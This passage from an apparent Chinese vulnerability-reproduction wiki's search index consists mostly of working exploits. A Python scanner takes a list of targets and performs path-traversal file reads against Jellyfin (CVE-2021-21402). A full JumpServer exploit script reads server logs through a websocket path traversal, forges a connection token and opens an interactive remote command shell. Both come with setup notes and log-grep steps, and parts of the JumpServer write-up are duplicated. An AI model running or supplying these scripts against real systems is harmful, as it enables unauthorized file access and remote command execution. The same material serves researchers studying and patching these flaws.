https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#\u6f0f\u6d1epoc","text":"import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033[0m') print('+ \\033[34mVersion: Jellyfin < 10.7.1 \\033[0m') print('+ \\033[36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033[0m') print('+ \\033[36mFile >>> ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and \"extension\" in response.text and \"font\" in response.text: print(\"\\033[32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e(\u8bfb\u53d6 windows/win.ini), \u94fe\u63a5\u4e3a:{} \\033[0m\".format(target_url, vuln_url)) else: print(\"\\033[31m[x] \u76ee\u6807 {} \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033[0m\".format(target_url)) except Exception as e: print(\"\\033[31m[x] \u76ee\u6807 {} \u8bf7\u6c42\u5931\u8d25 \\033[0m\".format(target_url)) def Scan(file_name): with open(file_name, \"r\", encoding='utf8') as scan_url: for url in scan_url: if url[:4] != \"http\": url = \"http://\" + url url = url.strip('\\n') try: POC_1(url) except Exception as e: print(\"\\033[31m[x] \u8bf7\u6c42\u62a5\u9519 \\033[0m\".format(e)) continue if __name__ == '__main__': title() file_name = str(input(\"\\033[35mPlease input Attack File\\nFile >>> \\033[0m\")) Scan(file_name)","title":"\u6f0f\u6d1ePOC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Jellyfin/Jellyfin%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%20CVE-2021-21402/#goby--poc","text":"[!NOTE] \u5df2\u4e0a\u4f20 https://github.com/PeiQi0/PeiQi-WIKI-POC Goby & POC \u76ee\u5f55\u4e2d Jellyfin 10.7.0 Unauthenticated Abritrary File Read CVE-2021-21402","title":"Goby &amp; POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/","text":"JumpServer \u672a\u6388\u6743\u63a5\u53e3 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 JumpServer \u662f\u5168\u7403\u9996\u6b3e\u5b8c\u5168\u5f00\u6e90\u7684\u5821\u5792\u673a, \u4f7f\u7528GNU GPL v2.0 \u5f00\u6e90\u534f\u8bae, \u662f\u7b26\u54084A \u7684\u4e13\u4e1a\u8fd0\u7ef4\u5ba1\u8ba1\u7cfb\u7edf\u3002 JumpServer \u4f7f\u7528Python / Django \u8fdb\u884c\u5f00\u53d1\u30022021\u5e741\u670815\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u63a7\u5230\u5f00\u6e90\u5821\u5792\u673aJumpServer\u53d1\u5e03\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u7531\u4e8e JumpServer \u67d0\u4e9b\u63a5\u53e3\u672a\u505a\u6388\u6743\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\u83b7\u53d6\u5230\u65e5\u5fd7\u6587\u4ef6\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u6267\u884c\u76f8\u5173API\u64cd\u4f5c\u63a7\u5236\u5176\u4e2d\u6240\u6709\u673a\u5668\u3002 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9 FOFA \u00b6 [!NOTE] app=\"FIT2CLOUD-JumpServer-\u5821\u5792\u673a\" \u73af\u5883\u642d\u5efa \u00b6 \u5b89\u88c5 JumpServer v2.6.1 \u7248\u672c \u4e0b\u8f7d\u94fe\u63a5 [!NOTE] \u5b89\u88c5\u6ce8\u610f \u914d\u7f6e\u7f51\u7edc\uff0c\u914d\u7f6eMysql\uff0c\u914d\u7f6eRedis \u9009\u62e9 n \u7b49\u5f85\u5b8c\u6210\u5b89\u88c5\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start \u7b49\u5f85\u5b89\u88c5\u5b8c\u6bd5\u8bbf\u95ee http://xxx.xxx.xxx.xxxx:8080 \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 amdin:admin \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u8fdb\u5165\u540e\u53f0\u6dfb\u52a0\u914d\u7f6e \u8d44\u4ea7\u7ba1\u7406 \u2192 \u7cfb\u7edf\u7528\u6237 \u8d44\u4ea7\u7ba1\u7406 \u2192 \u7ba1\u7406\u7528\u6237 \u7528\u6237\u7ba1\u7406 \u2192 \u7528\u6237\u5217\u8868 \u8d44\u4ea7\u7ba1\u7406 \u2192 \u8d44\u4ea7\u5217\u8868 \u67e5\u770b\u4e00\u4e0b\u9879\u76ee\u4ee3\u7801\u63d0\u4ea4\u53d8\u52a8 import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger ( __name__ ) class CeleryLogWebsocket ( JsonWebsocketConsumer ): disconnected = False def connect ( self ): user = self . scope [ \"user\" ] if user . is_authenticated and user . is_org_admin : self . accept () else : self . close () def receive ( self , text_data = None , bytes_data = None , ** kwargs ): data = json . loads ( text_data ) task_id = data . get ( \"task\" ) if task_id : self . handle_task ( task_id ) def wait_util_log_path_exist ( self , task_id ): log_path = get_celery_task_log_path ( task_id ) while not self . disconnected : if not os . path . exists ( log_path ): self . send_json ({ 'message' : '.' , 'task' : task_id }) time . sleep ( 0.5 ) continue self . send_json ({ 'message' : ' \\r\\n ' }) try : logger . debug ( 'Task log path: {} ' . format ( log_path )) task_log_f = open ( log_path , 'rb' ) return task_log_f except OSError : return None def read_log_file ( self , task_id ): task_log_f = self . wait_util_log_path_exist ( task_id ) if not task_log_f : logger . debug ( 'Task log file is None: {} ' . format ( task_id )) return task_end_mark = [] while not self . disconnected : data = task_log_f . read ( 4096 ) if data : data = data . replace ( b ' \\n ' , b ' \\r\\n ' ) self . send_json ( { 'message' : data . decode ( errors = 'ignore' ), 'task' : task_id } ) if data . find ( b 'succeeded in' ) != - 1 : task_end_mark . append ( 1 ) if data . find ( bytes ( task_id , 'utf8' )) != - 1 : task_end_mark . append ( 1 ) elif len ( task_end_mark ) == 2 : logger . debug ( 'Task log end: {} ' . format ( task_id )) break time . sleep ( 0.2 ) task_log_f . close () def handle_task ( self , task_id ): logger . info ( \"Task id: {} \" . format ( task_id )) thread = threading . Thread ( target = self . read_log_file , args = ( task_id ,)) thread . start () def disconnect ( self , close_code ): self . disconnected = True self . close () \u65b0\u7248\u5bf9\u7528\u6237\u8fdb\u884c\u4e86\u4e00\u4e2a\u5224\u65ad\uff0c\u53ef\u4ee5\u4f7f\u7528 \u8c37\u6b4c\u63d2\u4ef6 WebSocket King \u8fde\u63a5\u4e0a\u8fd9\u4e2awebsocket \u8fdb\u884c\u65e5\u5fd7\u8bfb\u53d6 \u6bd4\u5982send\u8fd9\u91cc\u83b7\u53d6\u7684 Task id ,\u8fd9\u91cc\u662f\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e9b\u654f\u611f\u7684\u4fe1\u606f\u7684 \u67e5\u770b\u4e00\u4e0b\u8fde\u63a5Web\u7ec8\u7aef\u7684\u540e\u7aefapi\u4ee3\u7801 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8c03\u7528\u65f6\u5fc5\u987b\u9700\u8981 user asset system_user \u8fd9\u4e09\u4e2a\u503c\uff0c\u518d\u83b7\u53d6\u4e00\u4e2a20\u79d2\u7684 token \u8bbf\u95eeweb\u7ec8\u7aef\u540e\u67e5\u770b\u65e5\u5fd7\u7684\u8c03\u7528 docker exec -it (jumpserve/core\u7684docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 \u53ef\u4ee5\u770b\u5230\u5728\u4e0d\u540c\u7684\u65f6\u95f4\u8bbf\u95ee\u8fd9\u4e2a\u63a5\u53e3\u7684asset_id\u7b49\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u53ea\u7528\u5728 **\u521a\u521a\u7684\u672a\u6388\u6743\u65e5\u5fd7\u8bfb\u53d6**\u91cc\u627e\u5230\u60f3\u8981\u7684\u8fd9\u51e0\u4e2a\u503c\u5c31\u53ef\u4ee5\u83b7\u5f97 token \u53d1\u9001\u8bf7\u6c42\u83b7\u53d620s\u7684token \u770b\u4e00\u4e0b koko.js \u8fd9\u4e2a\u524d\u7aef\u6587\u4ef6 \u540e\u7aef\u4ee3\u7801 https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go \u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 \u83b7\u5f97\u7684token\u6765\u6a21\u62df\u8bf7\u6c42 \u6210\u529f\u8fde\u63a5\u6a21\u62df\u4e86\u8fd9\u4e2a token \u7684\u8bf7\u6c42,\u53ef\u4ee5\u5728Network\u770b\u4e00\u4e0b\u6d41\u91cf\u662f\u600e\u4e48\u53d1\u9001\u7684 \u6a21\u62df\u8fde\u63a5\u53d1\u9001\u548c\u63a5\u53d1\u6570\u636e \u8fd9\u91cc\u53ef\u4ee5\u770b\u5230\u6211\u4eec\u53ea\u8981\u6a21\u62df\u4e86\u8fd9\u4e2a\u53d1\u9001\uff0c\u8fd4\u56de\u7684\u6570\u636e\u548cweb\u7ec8\u7aef\u662f\u4e00\u6837\u7684\uff0c\u90a3\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7\u8fd9\u6837\u7684\u65b9\u6cd5\u6765\u8fdb\u884c\u547d\u4ee4\u6267\u884c\u4e86 \u6f0f\u6d1e\u5229\u7528POC \u00b6 [!NOTE] POC \u91cc\u5305\u542b\u4e24\u4e2a\u65b9\u6cd5\uff0c\u4e00\u4e2a\u662f\u83b7\u53d6\u65e5\u5fd7\u6587\u4ef6\uff0c\u53e6\u4e00\u4e2a\u662f\u547d\u4ee4\u6267\u884c \u65e5\u5fd7\u63d0\u53d6\u5df2\u7ecf\u8fc7\u6ee4\u4e86\u90e8\u5206API\u8c03\u7528\u7684\u6570\u636e\uff0c\u53ea\u9700\u8981\u627e\u5230\u90a3\u51e0\u4e2a\u503c\u5c31\u597d\u4e86 \u547d\u4ee4\u6267\u884c\u9700\u8981\u4ece\u65e5\u5fd7\u4e2d\u83b7\u53d6\u654f\u611f\u6570\u636e\u5e76\u5199\u5165\u811a\u672c\u5bf9\u5e94\u7684\u53d8\u91cf\u4e2d \u63a5\u6536\u6570\u636e\u5982\u679c\u5361\u4f4f\u8bf7\u8c03\u6574 for i in range(7) \u8fd9\u4e2a\u4f4d\u7f6e\u7684 7 import requests import json import sys import time import asyncio import websockets import re from ws4py.client.threadedclient import WebSocketClient def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mGithub : https://github.com/PeiQi0 \\033 [0m' ) print ( '+ \\033 [34m\u516c\u4f17\u53f7 : PeiQi\u6587\u5e93 \\033 [0m' ) print ( '+ \\033 [34mPOC_Des: https://www.o2oxy.cn/ \\033 [0m' ) print ( '+ \\033 [34mVersion: JumpServer <= v2.6.1 \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+ \\033 [36mCmd >>> whoami \\033 [0m' ) print ( '+------------------------------------------' ) class ws_long ( WebSocketClient ): def opened ( self ): req = '{\"task\":\"peiqi/../../../../../logs/gunicorn\"}' self . send ( req ) def closed ( self , code , reason = None ): print ( \"Closed down:\" , code , reason ) def received_message ( self , resp ): resp = json . loads ( str ( resp )) # print(resp) data = resp [ 'message' ] print ( data ) if \"/api/v1/perms/asset-permissions/user/validate/?\" in data : print ( data ) async def send_msg ( websocket , _text ): if _text == \"exit\" : print ( f 'you have enter \"exit\", goodbye' ) await websocket . close ( reason = \"user exit\" ) return False await websocket . send ( _text ) recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) async def main_logic ( target_url ): print ( \" \\033 [32m[o] \u6b63\u5728\u8fde\u63a5\u76ee\u6807: {} \\033 [0m\" . format ( target_url )) async with websockets . connect ( target_url ) as websocket : recv_text = await websocket . recv () resws = json . loads ( recv_text ) id = resws [ 'id' ] print ( \" \\033 [36m[o] \u6210\u529f\u83b7\u53d6 ID: {} \\033 [0m\" . format ( id )) inittext = json . dumps ({ \"id\" : id , \"type\" : \"TERMINAL_INIT\" , \"data\" : \"{ \\\" cols \\\" :164, \\\" rows \\\" :17}\" }) await send_msg ( websocket , inittext ) for i in range ( 7 ): recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) while True : cmd = str ( input ( \" \\033 [35mcmd >>> \\033 [0m\" )) cmdtext = json . dumps ({ \"id\" : id , \"type\" : \"TERMINAL_DATA\" , \"data\" : cmd + \" \\r\\n \" }) await send_msg ( websocket , cmdtext ) for i in range ( 1 ): recv_text = await websocket . recv () print ( re . findall ( r '\"data\":\"(.*?)\"' , recv_text )) def POC_1 ( target_url ): vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" response = requests . get ( url = vuln_url , timeout = 5 ) print ( response . status_code ) ws_open = str ( input ( \" \\033 [32m[o] \u662f\u5426\u60f3\u8981\u63d0\u53d6\u65e5\u5fd7\uff08Y/N\uff09 >>> \\033 [0m\" )) try : if ws_open == \"Y\" or ws_open == \"y\" : ws = target_url . strip ( \"http://\" ) try : ws = ws_long ( 'ws:// {} /ws/ops/tasks/log/' . format ( ws )) ws . connect () ws . run_forever () ws . close () except KeyboardInterrupt : ws . close () else : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u65e0\u6cd5\u83b7\u53d6\u654f\u611f\u65e5\u5fd7\u4fe1\u606f \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u76ee\u6807\u6f0f\u6d1e\u5df2\u4fee\u590d\uff0c\u65e0\u6cd5\u83b7\u53d6\u654f\u611f\u65e5\u5fd7\u4fe1\u606f, {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) def POC_2 ( target_url , user , asset , system_user ): if target_url == \"\" or asset == \"\" or system_user == \"\" : print ( \" \\033 [31m[x] \u8bf7\u83b7\u53d6 assset \u7b49\u53c2\u6570\u914d\u7f6e \\033 [0m\" ) sys . exit ( 0 ) data = { \"user\" : user , \"asset\" : asset , \"system_user\" : system_user } vuln_url = target_url + \"/api/v1/users/connection-token/?user-only=1\" # vuln_url = target_url + \"/api/v1/authentication/connection-token/?user-only=1\" try : response = requests . post ( vuln_url , json = data , timeout = 5 ) . json () print ( \" \\033 [32m[o] \u6b63\u5728\u8bf7\u6c42\uff1a {} \\033 [0m\" . format ( vuln_url )) token = response [ 'token' ] print ( \" \\033 [36m[o] \u6210\u529f\u83b7\u53d6Token\uff1a {} \\033 [0m\" . format ( token )) ws_url = target_url . strip ( \"http://\" ) ws_url = \"ws://\" + ws_url + \"/koko/ws/token/?target_id= {} \" . format ( token ) asyncio . get_event_loop () . run_until_complete ( main_logic ( ws_url )) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u68c0\u67e5 assset \u7b49\u53c2\u6570\u914d\u7f6e, {} \\033 [0m\" . format ( e )) sys . exit ( 0 ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) user = \"ed3460eb-3c70-4beb-b631-f8f91c39bdd1\" asset = \"37fce0b0-cc4f-4822-8c33-afdebc888fa7\" system_user = \"da09ddd7-fd3f-46c3-914d-752883a4d950\" POC_1 ( target_url ) POC_2 ( target_url , user , asset , system_user )","title":"JumpServer \u672a\u6388\u6743\u63a5\u53e3 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#jumpserver-\u672a\u6388\u6743\u63a5\u53e3-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e","text":"","title":"JumpServer \u672a\u6388\u6743\u63a5\u53e3 \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"JumpServer \u662f\u5168\u7403\u9996\u6b3e\u5b8c\u5168\u5f00\u6e90\u7684\u5821\u5792\u673a, \u4f7f\u7528GNU GPL v2.0 \u5f00\u6e90\u534f\u8bae, \u662f\u7b26\u54084A \u7684\u4e13\u4e1a\u8fd0\u7ef4\u5ba1\u8ba1\u7cfb\u7edf\u3002 JumpServer \u4f7f\u7528Python / Django \u8fdb\u884c\u5f00\u53d1\u30022021\u5e741\u670815\u65e5\uff0c\u963f\u91cc\u4e91\u5e94\u6025\u54cd\u5e94\u4e2d\u5fc3\u76d1\u63a7\u5230\u5f00\u6e90\u5821\u5792\u673aJumpServer\u53d1\u5e03\u66f4\u65b0\uff0c\u4fee\u590d\u4e86\u4e00\u5904\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002\u7531\u4e8e JumpServer \u67d0\u4e9b\u63a5\u53e3\u672a\u505a\u6388\u6743\u9650\u5236\uff0c\u653b\u51fb\u8005\u53ef\u6784\u9020\u6076\u610f\u8bf7\u6c42\u83b7\u53d6\u5230\u65e5\u5fd7\u6587\u4ef6\u83b7\u53d6\u654f\u611f\u4fe1\u606f\uff0c\u6216\u8005\u6267\u884c\u76f8\u5173API\u64cd\u4f5c\u63a7\u5236\u5176\u4e2d\u6240\u6709\u673a\u5668\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] JumpServer < v2.6.2 JumpServer < v2.5.4 JumpServer < v2.4.5 JumpServer = v1.5.9","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#fofa","text":"[!NOTE] app=\"FIT2CLOUD-JumpServer-\u5821\u5792\u673a\"","title":"FOFA"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u73af\u5883\u642d\u5efa","text":"\u5b89\u88c5 JumpServer v2.6.1 \u7248\u672c \u4e0b\u8f7d\u94fe\u63a5 [!NOTE] \u5b89\u88c5\u6ce8\u610f \u914d\u7f6e\u7f51\u7edc\uff0c\u914d\u7f6eMysql\uff0c\u914d\u7f6eRedis \u9009\u62e9 n \u7b49\u5f85\u5b8c\u6210\u5b89\u88c5\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4 cd /opt/jumpserver-installer-v2.6.1 ./jmsctl.sh start \u7b49\u5f85\u5b89\u88c5\u5b8c\u6bd5\u8bbf\u95ee http://xxx.xxx.xxx.xxxx:8080 \u9ed8\u8ba4\u8d26\u53f7\u5bc6\u7801 amdin:admin","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/JumpServer%E5%A0%A1%E5%9E%92%E6%9C%BA/JumpServer%20%E6%9C%AA%E6%8E%88%E6%9D%83%E6%8E%A5%E5%8F%A3%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u590d\u73b0","text":"\u8fdb\u5165\u540e\u53f0\u6dfb\u52a0\u914d\u7f6e \u8d44\u4ea7\u7ba1\u7406 \u2192 \u7cfb\u7edf\u7528\u6237 \u8d44\u4ea7\u7ba1\u7406 \u2192 \u7ba1\u7406\u7528\u6237 \u7528\u6237\u7ba1\u7406 \u2192 \u7528\u6237\u5217\u8868 \u8d44\u4ea7\u7ba1\u7406 \u2192 \u8d44\u4ea7\u5217\u8868 \u67e5\u770b\u4e00\u4e0b\u9879\u76ee\u4ee3\u7801\u63d0\u4ea4\u53d8\u52a8 import time import os import threading import json from common.utils import get_logger from .celery.utils import get_celery_task_log_path from channels.generic.websocket import JsonWebsocketConsumer logger = get_logger ( __name__ ) class CeleryLogWebsocket ( JsonWebsocketConsumer ): disconnected = False def connect ( self ): user = self . scope [ \"user\" ] if user . is_authenticated and user . is_org_admin : self . accept () else : self . close () def receive ( self , text_data = None , bytes_data = None , ** kwargs ): data = json . loads ( text_data ) task_id = data . get ( \"task\" ) if task_id : self . handle_task ( task_id ) def wait_util_log_path_exist ( self , task_id ): log_path = get_celery_task_log_path ( task_id ) while not self . disconnected : if not os . path . exists ( log_path ): self . send_json ({ 'message' : '.' , 'task' : task_id }) time . sleep ( 0.5 ) continue self . send_json ({ 'message' : ' \\r\\n ' }) try : logger . debug ( 'Task log path: {} ' . format ( log_path )) task_log_f = open ( log_path , 'rb' ) return task_log_f except OSError : return None def read_log_file ( self , task_id ): task_log_f = self . wait_util_log_path_exist ( task_id ) if not task_log_f : logger . debug ( 'Task log file is None: {} ' . format ( task_id )) return task_end_mark = [] while not self . disconnected : data = task_log_f . read ( 4096 ) if data : data = data . replace ( b ' \\n ' , b ' \\r\\n ' ) self . send_json ( { 'message' : data . decode ( errors = 'ignore' ), 'task' : task_id } ) if data . find ( b 'succeeded in' ) != - 1 : task_end_mark . append ( 1 ) if data . find ( bytes ( task_id , 'utf8' )) != - 1 : task_end_mark . append ( 1 ) elif len ( task_end_mark ) == 2 : logger . debug ( 'Task log end: {} ' . format ( task_id )) break time . sleep ( 0.2 ) task_log_f . close () def handle_task ( self , task_id ): logger . info ( \"Task id: {} \" . format ( task_id )) thread = threading . Thread ( target = self . read_log_file , args = ( task_id ,)) thread . start () def disconnect ( self , close_code ): self . disconnected = True self . close () \u65b0\u7248\u5bf9\u7528\u6237\u8fdb\u884c\u4e86\u4e00\u4e2a\u5224\u65ad\uff0c\u53ef\u4ee5\u4f7f\u7528 \u8c37\u6b4c\u63d2\u4ef6 WebSocket King \u8fde\u63a5\u4e0a\u8fd9\u4e2awebsocket \u8fdb\u884c\u65e5\u5fd7\u8bfb\u53d6 \u6bd4\u5982send\u8fd9\u91cc\u83b7\u53d6\u7684 Task id ,\u8fd9\u91cc\u662f\u53ef\u4ee5\u83b7\u5f97\u4e00\u4e9b\u654f\u611f\u7684\u4fe1\u606f\u7684 \u67e5\u770b\u4e00\u4e0b\u8fde\u63a5Web\u7ec8\u7aef\u7684\u540e\u7aefapi\u4ee3\u7801 \u53ef\u4ee5\u770b\u5230\u8fd9\u91cc\u8c03\u7528\u65f6\u5fc5\u987b\u9700\u8981 user asset system_user \u8fd9\u4e09\u4e2a\u503c\uff0c\u518d\u83b7\u53d6\u4e00\u4e2a20\u79d2\u7684 token \u8bbf\u95eeweb\u7ec8\u7aef\u540e\u67e5\u770b\u65e5\u5fd7\u7684\u8c03\u7528 docker exec -it (jumpserve/core\u7684docker) /bin/bash cat gunicorn.log | grep /api/v1/perms/asset-permissions/user/validate/? assset_id=ee7e7446-6df7-4f60-b551-40a241958451 system_user_id=d89bd097-b7e7-4616-9422-766c6e4fcdb8 user_id=efede3f4-8659-4daa-8e95-9a841dbe82a8 \u53ef\u4ee5\u770b\u5230\u5728\u4e0d\u540c\u7684\u65f6\u95f4\u8bbf\u95ee\u8fd9\u4e2a\u63a5\u53e3\u7684asset_id\u7b49\u90fd\u662f\u4e00\u6837\u7684\uff0c\u6240\u4ee5\u53ea\u7528\u5728 **\u521a\u521a\u7684\u672a\u6388\u6743\u65e5\u5fd7\u8bfb\u53d6**\u91cc\u627e\u5230\u60f3\u8981\u7684\u8fd9\u51e0\u4e2a\u503c\u5c31\u53ef\u4ee5\u83b7\u5f97 token \u53d1\u9001\u8bf7\u6c42\u83b7\u53d620s\u7684token \u770b\u4e00\u4e0b koko.js \u8fd9\u4e2a\u524d\u7aef\u6587\u4ef6 \u540e\u7aef\u4ee3\u7801 https://github.com/jumpserver/koko/blob/e054394ffd13ac7c71a4ac980340749d9548f5e1/pkg/httpd/webserver.go \u8fd9\u91cc\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7 \u83b7\u5f97\u7684token\u6765\u6a21\u62df\u8bf7\u6c42 \u6210\u529f\u8fde\u63a5\u6a21\u62df\u4e86\u8fd9\u4e2a token \u7684\u8bf7\u6c42,\u53ef\u4ee5\u5728Network\u770b\u4e00\u4e0b\u6d41\u91cf\u662f\u600e\u4e48\u53d1\u9001\u7684 \u6a21\u62df\u8fde\u63a5\u53d1\u9001\u548c\u63a5\u53d1\u6570\u636e 